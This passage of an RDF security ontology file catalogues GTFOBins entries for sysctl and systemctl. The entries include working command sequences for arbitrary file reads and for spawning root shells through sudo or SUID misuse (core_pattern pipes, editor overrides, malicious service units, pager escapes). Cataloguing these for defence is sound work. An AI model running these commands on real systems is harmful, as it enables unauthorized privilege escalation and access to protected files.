    rdfs:label "sysctl-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files." ;
    d3f:uses mknd:executable_sysctl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_sysctl ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
/usr/sbin/sysctl -n "/../../$LFILE"
""" .

mknd:command_sysctl-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "sysctl-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_sysctl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_sysctl ;
    mknd:provides mknd:function_sudo ;
    mknd:value """COMMAND='/bin/sh -c id>/tmp/id'
sudo sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
""" .

mknd:command_sysctl-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "sysctl-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_sysctl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_sysctl ;
    mknd:provides mknd:function_suid ;
    mknd:value """COMMAND='/bin/sh -c id>/tmp/id'
./sysctl "kernel.core_pattern=|$COMMAND"
sleep 9999 &
kill -QUIT $!
cat /tmp/id
""" .

mknd:command_systemctl-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "systemctl-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply." ;
    d3f:uses mknd:executable_systemctl ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_systemctl ;
    mknd:provides mknd:function_sudo ;
    mknd:value """TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
""",
        """TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
""",
        """sudo systemctl
!sh
""" .

